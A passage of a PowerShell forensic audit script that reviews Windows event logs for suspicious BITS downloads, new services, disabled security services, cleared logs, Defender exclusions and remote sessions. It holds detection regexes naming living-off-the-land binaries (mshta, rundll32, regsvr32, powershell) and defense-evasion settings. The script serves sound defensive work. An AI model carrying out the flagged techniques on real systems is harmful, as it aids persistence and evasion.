            $uri = $null; [void][uri]::TryCreate($u, [UriKind]::Absolute, [ref]$uri)
            $h = if ($uri) { $uri.Host } else { $null }
            [pscustomobject]@{ url = (Protect-BvsUrl $u); host = $h; vendor = (Test-S04UpdateHost $h); exec = [bool]($u -match '(?i)\.(?:exe|dll|ps1|psm1|hta|vbs|vbe|js|jse|bat|cmd|scr|msi|cpl|lnk)(?:$|\?)') }
        }
        $creatorSig = $null
        if ($j.creator) {
            if (-not $sigCache.ContainsKey($j.creator)) { $sigCache[$j.creator] = Get-BvsSignature $j.creator }
            $creatorSig = $sigCache[$j.creator]
        }
        $nonVendor = @($hostsInfo | Where-Object { $_.host -and -not $_.vendor })
        [ordered]@{
            jobId = $j.jobId; title = (Protect-S04Line $j.title 200); owner = $j.owner; creator = $j.creator
            creatorSigner = $(if ($creatorSig) { $creatorSig.Signer }); creatorSignature = $(if ($creatorSig) { $creatorSig.Status })
            urls = @($hostsInfo | ForEach-Object url | Select-Object -First 20); hosts = @($hostsInfo | ForEach-Object host | Where-Object { $_ } | Sort-Object -Unique)
            nonVendorHosts = @($nonVendor | ForEach-Object host | Sort-Object -Unique); executableUrls = @($hostsInfo | Where-Object exec | ForEach-Object url | Select-Object -First 10)
            localNames = @($j.localNames | ForEach-Object { Protect-S04Line $_ 260 } | Select-Object -First 10)
            firstUtc = (ConvertTo-S04Iso $j.first); lastUtc = (ConvertTo-S04Iso $j.last); errors = $j.errors; eventIds = @($j.ids | Sort-Object)
        }
    }
    $rows = @($rows | Sort-Object { $_.lastUtc } -Descending)
    Add-BvsInventory -Run $run -Name 'bitsJobs' -Data @($rows | Select-Object -First 400)
    Add-BvsInventory -Run $run -Name 'bitsHostCounts' -Data @($rows | ForEach-Object { $_.hosts } | Group-Object | Sort-Object Count -Descending | ForEach-Object { [ordered]@{ host = $_.Name; jobs = $_.Count; vendor = (Test-S04UpdateHost $_.Name) } })
    foreach ($g in ($rows | Where-Object { $_.nonVendorHosts.Count -gt 0 } | Group-Object { ($_.nonVendorHosts -join ',') + '|' + $_.creator })) {
        $j0 = $g.Group[0]
        $creatorTrusted = $j0.creatorSignature -eq 'Valid' -and $j0.creator -and -not (Test-BvsUserWritable $j0.creator)
        $execUrl = @($g.Group | ForEach-Object { $_.executableUrls } | Where-Object { $_ }).Count -gt 0
        $sev = if ($execUrl -and -not $creatorTrusted) { 'high' } elseif ($creatorTrusted -and -not $execUrl) { 'low' } else { 'medium' }
        $ev = @($g.Group | Select-Object -First 8 | ForEach-Object { [ordered]@{ type = 'event'; log = $log; jobId = $_.jobId; title = $_.title; creator = $_.creator; creatorSigner = $_.creatorSigner; urls = $_.urls; localNames = $_.localNames; firstUtc = $_.firstUtc; lastUtc = $_.lastUtc } })
        New-BvsFinding -Run $run -Check 'bits.jobs' -Title ("BITS job(s) downloading from non-vendor host {0} (creator: {1})" -f ($j0.nonVendorHosts -join ', '), $(if ($j0.creator) { Split-Path -Leaf $j0.creator } else { 'unknown' })) `
            -Severity $sev -Class suspicious -Confidence $(if ($sev -eq 'high') { 'medium' } else { 'low' }) -Reasons @('bits_job', $(if ($execUrl) { 'executable_download' }), $(if (-not $creatorTrusted) { 'untrusted_creator' }) | Where-Object { $_ }) `
            -Evidence $ev -Entities @{ network = @($j0.nonVendorHosts | ForEach-Object { @{ host = $_ } }); processes = @(@{ path = $j0.creator; signer = $j0.creatorSigner }) } `
            -FpNotes 'Many apps use BITS for their own updates/content from hosts not on the vendor list (S04-history-iocs.json updateHosts). A validly signed creator in Program Files is usually benign.' `
            -Recommendation 'Check that the creating program is expected and that the host belongs to its vendor. Investigate the downloaded local files (paths in evidence) if the host is unknown.' -Mitre @('T1197')
    }
    Set-S04CoverageStatus -CheckId 'bits.jobs' -Logs @($log) -Capped $r.Capped
    @($rows)
}

#endregion

#region ---------- 4. System log ----------

function Resolve-S04ImagePath {
    param([string]$ImagePath)
    if (-not $ImagePath) { return $null }
    $p = $ImagePath.Trim()
    $p = $p -replace '^\\\?\?\\', '' -replace '^\\SystemRoot\\', "$env:SystemRoot\" -replace '(?i)^%SystemRoot%', $env:SystemRoot -replace '(?i)^%windir%', $env:SystemRoot
    if ($p -match '(?i)^system32\\') { $p = Join-Path $env:SystemRoot $p }
    $rc = Resolve-BvsCommandLine $p
    if ($rc) { return $rc.Executable }
    $p
}

$null = Invoke-BvsCheck -Run $run -Id 'system.services_new' -Description "System 7045: services installed in the last $Days days (name, image path, account), signature and folder checks" -Script {
    $r = Get-S04Events -LogName 'System' -Id 7045 -Provider 'Service Control Manager' -StartUtc $WindowStartUtc
    # Current registrations (read-only) to tell "updated to a new versioned folder" / "uninstalled" from "binary deleted".
    $svcAll = @(Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue) + @(Get-CimInstance -ClassName Win32_SystemDriver -ErrorAction SilentlyContinue)
    $rows = foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $img = [string]$d['ImagePath']
        $name = [string]$d['ServiceName']
        $keyName = if ($name -match '\(([^()]+)\)\s*$') { $Matches[1] } else { $null }
        $cur = $svcAll | Where-Object { $_.Name -eq $name -or $_.DisplayName -eq $name -or ($keyName -and $_.Name -eq $keyName) } | Select-Object -First 1
        $exe = Resolve-S04ImagePath $img
        $exists = $exe -and [IO.File]::Exists($exe)
        $curExe = if ($cur) { Resolve-S04ImagePath ([string]$cur.PathName) } else { $null }
        $curExists = $curExe -and [IO.File]::Exists($curExe)
        $state = if (-not $cur) { 'removed' } elseif ($exists) { 'present' } elseif ($curExists) { 'updated_path' } else { 'binary_missing' }
        $checkExe = if ($exists) { $exe } elseif ($curExists) { $curExe } else { $null }
        $sig = if ($checkExe) { Get-BvsSignature $checkExe } else { $null }
        $uw = if ($checkExe) { Test-BvsUserWritable $checkExe } elseif ($exe) { Test-BvsUserWritable $exe } else { $null }
        $flags = [System.Collections.Generic.List[string]]::new()
        if ($img -match '(?i)\b(?:cmd(?:\.exe)?\s+/[ck]|%COMSPEC%|powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32)\b|\\\\[^\\]+\\') { $flags.Add('interpreter_or_unc_in_imagepath') }
        if ($uw) { $flags.Add('user_writable') }
        if ($sig -and $sig.Status -ne 'Valid') { $flags.Add($(if ($sig.Status -eq 'NotSigned') { 'unsigned' } else { 'invalid_signature' })) }
        if ($state -eq 'binary_missing') { $flags.Add('binary_missing') }
        if ($exe -and $exe -match '(?i)\\(?:Temp|Downloads|AppData|Users\\Public|ProgramData\\[^\\]+\.(?:exe|sys))') { $flags.Add('unusual_folder') }
        [ordered]@{
            timeUtc = (ConvertTo-S04Iso $e.TimeCreated); serviceName = $name; imagePath = (Protect-S04Line $img 400); resolvedPath = $exe
            serviceType = [string]$d['ServiceType']; startType = [string]$d['StartType']; account = [string]$d['AccountName']
            state = $state; currentPath = $curExe; currentStartMode = $(if ($cur) { [string]$cur.StartMode }); currentState = $(if ($cur) { [string]$cur.State })
            signature = $(if ($sig) { $sig.Status }); signer = $(if ($sig) { $sig.Signer }); userWritable = $uw; flags = @($flags)
        }
    }
    $rows = @($rows)
    Add-BvsInventory -Run $run -Name 'newServices' -Data $rows
    foreach ($s in $rows) {
        $f = $s.flags
        if ($f.Count -eq 0) { continue }
        $sev = 'low'
        if ($f -contains 'interpreter_or_unc_in_imagepath') { $sev = 'high' }
        elseif ($f -contains 'user_writable' -and ($f -contains 'unsigned' -or $f -contains 'invalid_signature')) { $sev = 'high' }
        elseif ($f -contains 'user_writable' -or $f -contains 'unsigned' -or $f -contains 'invalid_signature') { $sev = 'medium' }
        $exp = $null
        foreach ($it in (Get-BvsExpected -Category listener)) { if ($it.match.service -and $s.serviceName -match [regex]::Escape([string]$it.match.service)) { $exp = [ordered]@{ id = $it.id; reason = $it.reason } } }
        $reasons = @('persistence') + @($f | ForEach-Object { switch ($_) { 'user_writable' { 'user_writable' } 'unsigned' { 'unsigned' } 'invalid_signature' { 'invalid_signature' } 'interpreter_or_unc_in_imagepath' { 'lolbin' } default { $_ } } })
        New-BvsFinding -Run $run -Check 'system.services_new' -Title ("New service '{0}' ({1})" -f $s.serviceName, ($f -join ', ')) -Severity $sev -Class $(if ($sev -in 'high', 'medium') { 'suspicious' } else { 'hygiene' }) `
            -Confidence $(if ($sev -eq 'high') { 'medium' } else { 'low' }) -Reasons $reasons -Expected $exp `
            -Evidence @([ordered]@{ type = 'event'; log = 'System'; id = 7045; time = $s.timeUtc; serviceName = $s.serviceName; imagePath = $s.imagePath; account = $s.account; startType = $s.startType; signature = $s.signature; signer = $s.signer }) `
            -Entities @{ files = @(@{ path = $s.resolvedPath; sig = $s.signature; signer = $s.signer }) } `
            -FpNotes 'Installers and updaters register services all the time; a missing binary usually means the product was uninstalled or updated to a new versioned folder.' `
            -Recommendation 'Check the service in services.msc (do not change it): is the product known, is the binary signed by its vendor and located in Program Files? Remove only via the product''s own uninstaller after confirming it is unwanted.' -Mitre @('T1543.003')
    }
    if ($rows.Count -gt 0) {
        New-BvsFinding -Run $run -Check 'system.services_new' -Title ("{0} service(s) installed in the last {1} days" -f $rows.Count, $Days) -Severity info -Class info -Confidence high `
            -Evidence @($rows | Select-Object -First 30 | ForEach-Object { [ordered]@{ type = 'event'; log = 'System'; id = 7045; time = $_.timeUtc; serviceName = $_.serviceName; path = $_.resolvedPath; state = $_.state; account = $_.account; signer = $_.signer; flags = $_.flags } }) `
            -FpNotes 'Inventory for the timeline; individual problems are separate findings.' -Recommendation 'None.' -Mitre @('T1543.003')
    }
    Set-S04CoverageStatus -CheckId 'system.services_new' -Logs @('System') -Capped $r.Capped
    $rows
}

$null = Invoke-BvsCheck -Run $run -Id 'system.service_starttype' -Description 'System 7040: service start-type changes (WinDefend, wuauserv, Avast and other security services highlighted)' -Script {
    $r = Get-S04Events -LogName 'System' -Id 7040 -Provider 'Service Control Manager' -StartUtc $WindowStartUtc
    $watched = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.watchedServices), [StringComparer]::OrdinalIgnoreCase)
    $critical = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.criticalServices), [StringComparer]::OrdinalIgnoreCase)
    $wRx = [regex]::new([string]$ioc.watchedServiceRegex, $RxOpts, $RxTimeout)
    $counts = @{}
    $rows = [System.Collections.Generic.List[object]]::new()
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $svc = [string]$d['param4']
        if (-not $svc) { $svc = [string]$d['param1'] }
        if ($counts.ContainsKey($svc)) { $counts[$svc]++ } else { $counts[$svc] = 1 }
        if (-not ($watched.Contains($svc) -or $wRx.IsMatch($svc) -or $wRx.IsMatch([string]$d['param1']))) { continue }
        $cur = (Get-BvsRegValues -Path "HKLM\SYSTEM\CurrentControlSet\Services\$svc" | Where-Object Name -eq 'Start' | Select-Object -First 1).Value
        $rows.Add([ordered]@{ timeUtc = (ConvertTo-S04Iso $e.TimeCreated); service = $svc; displayName = [string]$d['param1']; from = [string]$d['param2']; to = [string]$d['param3']; currentStart = $cur; currentStartName = $(switch ($cur) { 0 { 'boot' } 1 { 'system' } 2 { 'auto' } 3 { 'demand' } 4 { 'disabled' } default { $null } }); critical = $critical.Contains($svc) })
    }
    Add-BvsInventory -Run $run -Name 'serviceStartTypeChanges' -Data @($rows)
    Add-BvsInventory -Run $run -Name 'serviceStartTypeChangeCounts' -Data @($counts.GetEnumerator() | Sort-Object Value -Descending | ForEach-Object { [ordered]@{ service = $_.Key; changes = $_.Value } })
    foreach ($g in ($rows | Group-Object { $_.service })) {
        $last = $g.Group | Sort-Object { $_.timeUtc } | Select-Object -Last 1
        $disabledNow = $last.currentStart -eq 4
        $sev = if ($last.critical -and $disabledNow) { 'medium' } elseif ($disabledNow) { 'low' } else { 'info' }
        New-BvsFinding -Run $run -Check 'system.service_starttype' -Title ("Start type of security-relevant service '{0}' changed {1} time(s); currently {2}" -f $g.Name, $g.Count, $(if ($last.currentStartName) { $last.currentStartName } else { 'unknown' })) `
            -Severity $sev -Class $(if ($sev -eq 'info') { 'info' } else { 'hardening' }) -Confidence medium -Reasons @($(if ($disabledNow) { 'service_disabled' }) | Where-Object { $_ }) `
            -Evidence @($g.Group | Select-Object -Last 10 | ForEach-Object { [ordered]@{ type = 'event'; log = 'System'; id = 7040; time = $_.timeUtc; service = $_.service; from = $_.from; to = $_.to; currentStart = $_.currentStart } }) `
            -FpNotes 'AV installs/updates (e.g. Avast taking over from Defender) and Windows servicing change start types legitimately. from/to values are localized strings as logged.' `
            -Recommendation 'Confirm the change matches an AV install/update or a deliberate user action. Re-enable a disabled critical service only through its normal settings UI.' -Mitre @('T1562.001')
    }
    Set-S04CoverageStatus -CheckId 'system.service_starttype' -Logs @('System') -Capped $r.Capped
    @($rows)
}

$null = Invoke-BvsCheck -Run $run -Id 'system.log_cleared' -Description 'System 104 (Microsoft-Windows-Eventlog): event logs cleared' -Script {
    $r = Get-S04Events -LogName 'System' -Id 104 -Provider 'Microsoft-Windows-Eventlog' -StartUtc $WindowStartUtc
    $rows = foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        [ordered]@{ timeUtc = (ConvertTo-S04Iso $e.TimeCreated); channel = [string]$d['Channel']; user = (('{0}\{1}' -f $d['SubjectDomainName'], $d['SubjectUserName']).Trim('\')); backupPath = [string]$d['BackupPath'] }
    }
    $rows = @($rows)
    $post = @()
    try { $post = @(Get-WinEvent -FilterHashtable @{ LogName = 'System'; Id = 104; ProviderName = 'Microsoft-Windows-Eventlog'; StartTime = $AuditUtc } -MaxEvents 100 -ErrorAction Stop | ForEach-Object { $dd = Get-S04EventData $_; [ordered]@{ timeUtc = (ConvertTo-S04Iso $_.TimeCreated); channel = [string]$dd['Channel']; user = [string]$dd['SubjectUserName'] } }) } catch { }
    Add-BvsInventory -Run $run -Name 'logClears' -Data ([ordered]@{ preAudit = $rows; postAudit = @($post); note = 'postAudit clears happened during this scan and are excluded from findings (no collector may clear logs: investigate if any appear)' })
    foreach ($g in ($rows | Group-Object { $_.channel })) {
        $important = $g.Name -match '(?i)^(System|Security|Application|Windows PowerShell|Microsoft-Windows-PowerShell/Operational|PowerShellCore/Operational|Microsoft-Windows-Sysmon/Operational|Microsoft-Windows-Windows Defender/Operational|Microsoft-Windows-TaskScheduler/Operational)$'
        New-BvsFinding -Run $run -Check 'system.log_cleared' -Title ("Event log '{0}' was cleared ({1}x, last by {2})" -f $g.Name, $g.Count, ($g.Group | Select-Object -Last 1).user) -Severity $(if ($important) { 'high' } else { 'medium' }) -Class suspicious -Confidence medium -Reasons @('anti_forensics') `
            -Evidence @($g.Group | ForEach-Object { [ordered]@{ type = 'event'; log = 'System'; id = 104; time = $_.timeUtc; channel = $_.channel; user = $_.user } }) `
            -FpNotes 'Users, cleanup tools (CCleaner and similar) and troubleshooting guides clear logs; clearing also wipes the evidence S04 relies on.' `
            -Recommendation 'Ask the user whether they (or a cleanup tool) cleared this log. If not, treat as anti-forensics: review other sources (Defender, Avast, Prefetch, Amcache) for the period before the clear.' -Mitre @('T1070.001')
    }
    Set-S04CoverageStatus -CheckId 'system.log_cleared' -Logs @('System') -Capped $r.Capped
    $rows
}

$null = Invoke-BvsCheck -Run $run -Id 'system.shutdowns' -Description 'System 1074 (planned shutdown/restart), 6008 (unexpected shutdown), 41 (Kernel-Power) for timeline context' -Script {
    $r = Get-S04Events -LogName 'System' -Id 1074, 6008, 41 -StartUtc $WindowStartUtc
    $rows = foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $o = [ordered]@{ timeUtc = (ConvertTo-S04Iso $e.TimeCreated); id = $e.Id; provider = $e.ProviderName }
        switch ($e.Id) {
            1074 { $o.process = [string]$d['param1']; $o.reasonCode = [string]$d['param4']; $o.type = [string]$d['param5']; $o.comment = (Protect-S04Line ([string]$d['param6']) 200); $o.user = [string]$d['param7'] }
            41 { $o.bugcheckCode = [string]$d['BugcheckCode']; $o.sleepInProgress = [string]$d['SleepInProgress']; $o.powerButtonTimestamp = [string]$d['PowerButtonTimestamp'] }
            6008 { $o.lastShutdown = (('{0} {1}' -f $d['Data1'], $d['Data0']).Trim()) }
        }
        $o
    }
    $rows = @($rows)
    Add-BvsInventory -Run $run -Name 'shutdownContext' -Data ([ordered]@{ counts = [ordered]@{ planned1074 = @($rows | Where-Object id -eq 1074).Count; unexpected6008 = @($rows | Where-Object id -eq 6008).Count; kernelPower41 = @($rows | Where-Object id -eq 41).Count }; recent = @($rows | Select-Object -First 25); processes1074 = @($rows | Where-Object id -eq 1074 | Group-Object { ($_.process -replace '\s*\(.*$', '') } | Sort-Object Count -Descending | ForEach-Object { [ordered]@{ process = $_.Name; count = $_.Count } }) })
    Set-S04CoverageStatus -CheckId 'system.shutdowns' -Logs @('System') -Capped $r.Capped
    $rows
}

#endregion

#region ---------- 5. Installs timeline ----------

$null = Invoke-BvsCheck -Run $run -Id 'installs.msi' -Description "Application log MsiInstaller 11707/1033/1034/11724: MSI installs/removals in the last $Days days (product, version, date)" -Script {
    $r = Get-S04Events -LogName 'Application' -Id 11707, 1033, 1034, 11724 -Provider 'MsiInstaller' -StartUtc $WindowStartUtc
    $sidNames = @{}
    $entries = [System.Collections.Generic.List[object]]::new()
    foreach ($e in ($r.Events | Sort-Object TimeCreated)) {
        $d = Get-S04EventData $e
        $code = $null
        if ($d['Binary']) {
            try {
                $hex = [string]$d['Binary']
                $bytes = [byte[]]::new($hex.Length / 2)
                for ($k = 0; $k -lt $bytes.Length; $k++) { $bytes[$k] = [Convert]::ToByte($hex.Substring($k * 2, 2), 16) }
                $txt = [Text.Encoding]::ASCII.GetString($bytes)
                if ($txt -match '\{[0-9A-Fa-f-]{36}\}') { $code = $Matches[0].ToUpperInvariant() }
            }
            catch { }
        }
        $sid = if ($e.UserId) { $e.UserId.Value } else { $null }
        if ($sid -and -not $sidNames.ContainsKey($sid)) { try { $sidNames[$sid] = ([Security.Principal.SecurityIdentifier]$sid).Translate([Security.Principal.NTAccount]).Value } catch { $sidNames[$sid] = $sid } }
        $action = if ($e.Id -in 1033, 11707) { 'install' } else { 'remove' }
        $product = $null; $version = $null; $manufacturer = $null; $status = $null
        if ($e.Id -in 1033, 1034) { $product = [string]$d['Data0']; $version = [string]$d['Data1']; $status = [string]$d['Data3']; $manufacturer = [string]$d['Data4'] }
        elseif ([string]$d['Data0'] -match '^[^:]{1,40}:\s*(.+?)\s+--\s+') { $product = $Matches[1] }
        $t = $e.TimeCreated.ToUniversalTime()
        $match = $entries | Where-Object { $_.action -eq $action -and ((($code -and $_.productCode -eq $code) -or ($product -and $_.product -eq $product))) -and ([math]::Abs(([datetime]$_.t - $t).TotalMinutes) -le 10) } | Select-Object -First 1
        if ($match) {
            $match.eventIds = @($match.eventIds + $e.Id | Sort-Object -Unique)
            if (-not $match.version -and $version) { $match.version = $version }
            if (-not $match.manufacturer -and $manufacturer) { $match.manufacturer = $manufacturer }
            if (-not $match.productCode -and $code) { $match.productCode = $code }
            if ($null -eq $match.status -and $status) { $match.status = $status }
            continue
        }
        $entries.Add([pscustomobject][ordered]@{ t = $t; timeUtc = (ConvertTo-S04Iso $t); action = $action; product = $product; version = $version; manufacturer = $manufacturer; status = $status; productCode = $code; user = $(if ($sid) { $sidNames[$sid] }); eventIds = @($e.Id) })
    }
    $timeline = @($entries | Sort-Object t -Descending | Select-Object timeUtc, action, product, version, manufacturer, status, productCode, user, eventIds)
    Add-BvsInventory -Run $run -Name 'installTimeline' -Data $timeline
    if ($timeline.Count -gt 0) {
        New-BvsFinding -Run $run -Check 'installs.msi' -Title ("{0} MSI install(s) and {1} removal(s) in the last {2} days" -f @($timeline | Where-Object action -eq 'install').Count, @($timeline | Where-Object action -eq 'remove').Count, $Days) `
            -Severity info -Class info -Confidence high -Evidence @($timeline | Select-Object -First 25 | ForEach-Object { [ordered]@{ type = 'event'; log = 'Application'; provider = 'MsiInstaller'; time = $_.timeUtc; action = $_.action; product = $_.product; version = $_.version; manufacturer = $_.manufacturer } }) `
            -FpNotes 'Timeline context for the verdict and the dashboard. Only MSI-based installs are logged here (EXE/MSIX/portable installs are not).' -Recommendation 'Review for products the user does not recognise.'
    }
    Set-S04CoverageStatus -CheckId 'installs.msi' -Logs @('Application') -Capped $r.Capped
    $timeline
}

#endregion

#region ---------- 6. Defender ----------

function Get-S04AvastInstallDate {
    foreach ($root in 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall') {
        foreach ($sk in @(Get-BvsRegSubKeys -Path $root)) {
            $v = @(Get-BvsRegValues -Path "$root\$sk")
            $dn = [string]($v | Where-Object Name -eq 'DisplayName' | Select-Object -First 1).Value
            if ($dn -match '(?i)^Avast') {
                $idt = [string]($v | Where-Object Name -eq 'InstallDate' | Select-Object -First 1).Value
                return [ordered]@{ product = $dn; installDate = $idt; keyLastWriteUtc = (ConvertTo-S04Iso (Get-BvsRegKeyLastWrite -Path "$root\$sk")) }
            }
        }
    }
    $null
}

$null = Invoke-BvsCheck -Run $run -Id 'defender.operational' -Description 'Defender/Operational 1116-1119 detections, 5001 RTP off, 5007 config changes (exclusions), 5010/5012 (whole log: it is small and old exclusions stay active)' -Script {
    $log = 'Microsoft-Windows-Windows Defender/Operational'
    $r = Get-S04Events -LogName $log -Max 20000
    $avast = Get-S04AvastInstallDate
    $counts = @($r.Events | Group-Object Id | Sort-Object Count -Descending | ForEach-Object { [ordered]@{ id = [int]$_.Name; count = $_.Count; firstUtc = (ConvertTo-S04Iso ($_.Group | Sort-Object TimeCreated | Select-Object -First 1).TimeCreated); lastUtc = (ConvertTo-S04Iso ($_.Group | Sort-Object TimeCreated | Select-Object -Last 1).TimeCreated) } })
    $rel = @($r.Events | Where-Object { $_.Id -in 1116, 1117, 1118, 1119, 5001, 5007, 5010, 5012 })
    $rows = foreach ($e in $rel) {
        $d = Get-S04EventData $e
        $o = [ordered]@{ timeUtc = (ConvertTo-S04Iso $e.TimeCreated); id = $e.Id; productVersion = [string]$d['Product Version'] }
        if ($e.Id -eq 5007) { $o.oldValue = (Protect-S04Line ([string]$d['Old Value']) 300); $o.newValue = (Protect-S04Line ([string]$d['New Value']) 300) }
        if ($e.Id -in 1116, 1117, 1118, 1119) { $o.threat = [string]$d['Threat Name']; $o.severity = [string]$d['Severity Name']; $o.category = [string]$d['Category Name']; $o.path = (Protect-S04Line ([string]$d['Path']) 300); $o.action = [string]$d['Action Name']; $o.process = [string]$d['Process Name']; $o.user = [string]$d['Detection User'] }
        $o
    }
    $rows = @($rows)
    Add-BvsInventory -Run $run -Name 'defender' -Data ([ordered]@{ eventCounts = $counts; events = @($rows | Select-Object -First 300); avastInstall = $avast; note = 'Whole log read (not limited to the window).' })
    $exclRx = [regex]::new('\\Exclusions\\(Paths|Extensions|Processes|IpAddresses|TemporaryPaths)\\(.+?)\s*=', $RxOpts, $RxTimeout)
    foreach ($x in ($rows | Where-Object { $_.id -eq 5007 })) {
        $m = $exclRx.Match([string]$x.newValue)
        if ($m.Success) {
            $target = $m.Groups[2].Value
            $broad = $target -match '(?i)^[a-z]:\\?$|\\(?:Temp|Downloads|AppData|Users\\Public)\b|^\*|^\.(?:exe|dll|ps1|js|vbs|bat)$|powershell|cmd\.exe|rundll32|wscript'
            New-BvsFinding -Run $run -Check 'defender.operational' -Title ("Defender exclusion added: {0} '{1}'" -f $m.Groups[1].Value, $target) -Severity $(if ($broad) { 'high' } else { 'medium' }) -Class suspicious -Confidence medium -Reasons @('defense_evasion') `
                -Evidence @([ordered]@{ type = 'event'; log = $log; id = 5007; time = $x.timeUtc; newValue = $x.newValue; oldValue = $x.oldValue }) `
                -FpNotes 'Developers add exclusions for build/tool folders; AV vendors and installers sometimes add their own. Exclusions stay active even while Defender is in passive/off mode.' `
                -Recommendation 'Ask the user whether they added it. Review the exclusion list in Windows Security (elevated view) and remove exclusions nobody recognises.' -Mitre @('T1562.001')
        }
        elseif ([string]$x.newValue -match '(?i)\\(DisableAntiSpyware|DisableRealtimeMonitoring|DisableBehaviorMonitoring|DisableIOAVProtection|TamperProtection)\s*=\s*(0x\w+|\d+)') {
            $name = $Matches[1]; $val = $Matches[2]
            $off = ($name -eq 'TamperProtection' -and $val -match '^(0x0|0x4|0|4)$') -or ($name -ne 'TamperProtection' -and $val -match '^(0x1|1)$')
            if ($off) {
                New-BvsFinding -Run $run -Check 'defender.operational' -Title ("Defender protection setting changed: {0} = {1}" -f $name, $val) -Severity low -Class hardening -Confidence low -Reasons @('defense_evasion') `
                    -Evidence @([ordered]@{ type = 'event'; log = $log; id = 5007; time = $x.timeUtc; newValue = $x.newValue; avastInstall = $avast }) `
                    -FpNotes 'Defender turns its own protection off when a third-party AV (Avast) registers; expected item defender-off-avast.' -Recommendation 'Confirm Avast is active and up to date.' -Mitre @('T1562.001') `
                    -Expected $(if (Get-S04ExpectedItem 'defender-off-avast') { [ordered]@{ id = 'defender-off-avast'; reason = (Get-S04ExpectedItem 'defender-off-avast').reason } })
            }
        }
    }
    $pt = Get-S04ExpectedItem 'pentest-tools'
    foreach ($g in ($rows | Where-Object { $_.id -in 1116, 1117, 1118, 1119 } | Group-Object { $_.threat })) {
        $remediated = @($g.Group | Where-Object id -eq 1117).Count -gt 0
        $failed = @($g.Group | Where-Object { $_.id -in 1118, 1119 }).Count -gt 0
        $sev = if ($failed -or -not $remediated) { 'high' } else { 'medium' }
        $exp = $null
        if ($pt -and $g.Name -match ('(?i)^(' + ((@($pt.match.detectionTypes) | ForEach-Object { [regex]::Escape($_) }) -join '|') + '):')) { $sev = Limit-S04Severity $sev $pt.severityCap; $exp = [ordered]@{ id = $pt.id; reason = $pt.reason } }
        New-BvsFinding -Run $run -Check 'defender.operational' -Title ("Defender detection: {0} ({1})" -f $g.Name, $(if ($remediated) { 'action taken' } else { 'no remediation logged' })) -Severity $sev -Class suspicious -Confidence high -Reasons @('av_match') -Expected $exp `
            -Evidence @($g.Group | Select-Object -First 10 | ForEach-Object { [ordered]@{ type = 'event'; log = $log; id = $_.id; time = $_.timeUtc; threat = $_.threat; path = $_.path; action = $_.action; process = $_.process; user = $_.user } }) `
            -FpNotes 'Historic detection; the file may already be removed. HackTool/PUP detections are plausible if the user does security work on purpose.' `
            -Recommendation 'Check whether the detected path still exists (verifier) and whether Avast also detected it; confirm with the user.' -Mitre @()
    }
    $rtp = @($rows | Where-Object { $_.id -in 5001, 5010, 5012 })
    if ($rtp.Count -gt 0) {
        New-BvsFinding -Run $run -Check 'defender.operational' -Title ("Defender protection disabled events (5001/5010/5012): {0}" -f $rtp.Count) -Severity low -Class hardening -Confidence low -Reasons @('defense_evasion') `
            -Evidence @($rtp | Select-Object -First 10 | ForEach-Object { [ordered]@{ type = 'event'; log = $log; id = $_.id; time = $_.timeUtc } }) `
            -FpNotes "Defender disables itself when Avast registers as the active AV (Avast install: $(if ($avast) { $avast.installDate } else { 'unknown' }))." -Recommendation 'Confirm the timing matches the Avast install and that Avast is active.' -Mitre @('T1562.001')
    }
    Set-S04CoverageStatus -CheckId 'defender.operational' -Logs @($log) -Capped $r.Capped
    $rows
}

#endregion

#region ---------- 7. Remote sessions ----------

$null = Invoke-BvsCheck -Run $run -Id 'remote.sessions' -Description 'TerminalServices LocalSessionManager 21/22/24/25 (logon/reconnect with source address) and RemoteConnectionManager 1149; non-local sources flagged' -Script {
    $lsm = 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
    $rcm = 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'
    $r1 = Get-S04Events -LogName $lsm -Id 21, 22, 24, 25 -StartUtc $WindowStartUtc
    $r2 = Get-S04Events -LogName $rcm -Id 1149 -StartUtc $WindowStartUtc
    $rows = [System.Collections.Generic.List[object]]::new()
    foreach ($e in @($r1.Events) + @($r2.Events)) {
        $d = Get-S04EventData $e
        if ($e.Id -eq 1149) { $user = ('{0}\{1}' -f $d['Param2'], $d['Param1']).Trim('\'); $addr = [string]$d['Param3']; $sess = $null }
        else { $user = [string]$d['User']; $addr = [string]$d['Address']; $sess = [string]$d['SessionID'] }
        $ip = $null
        $cls = 'local'
        if ([Net.IPAddress]::TryParse($addr, [ref]$ip)) {
            if ([Net.IPAddress]::IsLoopback($ip)) { $cls = 'loopback' }
            elseif ($ip.AddressFamily -eq [Net.Sockets.AddressFamily]::InterNetwork -and $ip.GetAddressBytes()[0] -eq 100 -and $ip.GetAddressBytes()[1] -ge 64 -and $ip.GetAddressBytes()[1] -le 127) { $cls = 'tailnet' }
            elseif (Test-S04PrivateIp $ip) { $cls = 'lan' }
            else { $cls = 'public' }
        }
        $rows.Add([ordered]@{ timeUtc = (ConvertTo-S04Iso $e.TimeCreated); id = $e.Id; user = $user; sessionId = $sess; address = $addr; addressClass = $cls })
    }
    $nonLocal = @($rows | Where-Object { $_.addressClass -in 'lan', 'tailnet', 'public' })
    Add-BvsInventory -Run $run -Name 'remoteSessions' -Data ([ordered]@{
            byAddressClass = @($rows | Group-Object { $_.addressClass } | ForEach-Object { [ordered]@{ class = $_.Name; events = $_.Count } })
            byUser = @($rows | Group-Object { $_.user } | ForEach-Object { [ordered]@{ user = $_.Name; events = $_.Count } })
            nonLocal = @($nonLocal | Select-Object -First 200); edition = $OsCaption
        })
    foreach ($g in ($nonLocal | Group-Object { $_.address })) {
        $c = $g.Group[0].addressClass
        $exp = $null
        if ($c -eq 'tailnet' -and (Get-S04ExpectedItem 'tailscale')) { $exp = [ordered]@{ id = 'tailscale'; reason = (Get-S04ExpectedItem 'tailscale').reason } }
